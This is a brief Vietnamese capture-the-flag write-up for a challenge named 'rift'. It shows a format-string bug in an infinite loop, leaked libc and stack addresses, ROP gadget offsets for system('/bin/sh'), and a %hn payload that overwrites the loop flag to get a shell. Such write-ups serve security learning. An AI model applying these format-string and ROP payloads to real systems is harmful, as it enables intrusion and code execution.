# write up rift 
- mặc dù bài có chứa formatstring nhưng vì vòng lặp vô tận nên em phải phá được vòng lặp ra 
```c 
void vuln() {
    int always_true = 1;
    while (always_true) {
        fgets(buf, sizeof(buf), stdin);
        printf(buf);
    }
}
```assembly
[DEBUG] Sent 0x6 bytes:
    b'%11$p\n'
[DEBUG] Received 0xf bytes:
    b'0x7ffff7e3109b\n'

[DEBUG] Sent 0x5 bytes:
    b'%8$p\n'
[DEBUG] Received 0xf bytes:
    b'0x7fffffffe770\n'
[*] addr: 0x7ffff7e3109b
[*] target0x7fffffffe778
[*] base: 0x7ffff7e0d000
```
- sau khi leak được địa chỉ thì em sẽ thực hiện tính toán các địa chỉ cần thiết để từ đó ghi vào rip 
```c
    system_libc = base + libc.symbols["system"]
    pop_rdi = base + 0x0000000000023a5f
    bin_sh = base + 0x18052c 
```
- sau khi ghi xong thì ta cần cho chương trình nhảy vào return để thực thi 
```assembly
0x00005555555551f3 <+61>:	cmp    DWORD PTR [rbp-0x4],0x0
0x00005555555551f7 <+65>:	jne    0x5555555551c7 <vuln+17>
```python
    sl(f"%{break_loop&0xffff}c%27$hn".encode())
    delete()
```
khi chạy thì sẽ lấy được shell như bình thường 

